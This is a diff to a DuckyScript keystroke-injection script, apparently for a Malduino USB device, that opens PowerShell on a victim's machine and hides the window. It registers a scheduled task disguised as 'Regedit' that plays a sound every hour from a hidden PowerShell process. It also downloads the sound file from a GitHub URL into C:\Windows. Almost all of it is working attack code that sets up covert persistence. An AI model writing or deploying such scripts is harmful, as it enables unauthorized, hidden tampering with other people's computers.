@@ -10,11 +10,10 @@ DELAY 5000
 REM Resize PowerShell window
 STRING mode con cols=20 lines=1
 ENTER
+REM Run payload in hidden window
 STRING Register-ScheduledTask Regedit 
 STRING -Action (New-ScheduledTaskAction -Execute PowerShell -Argument "Start-process -WindowStyle Hidden PowerShell '(New-Object System.Media.SoundPlayer C:\Windows\Jjgw.wav).PlaySync()'") 
 STRING -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)) -f;
-ENTER
-REM Run payload in hidden window
 STRING Start-Process -WindowStyle Hidden PowerShell "
 REM Payload
 STRING Invoke-WebRequest https://github.com/Gyanbu/MalduinoScripts/raw/master/Jjgw.wav -OutFile C:\Windows\Jjgw.wav
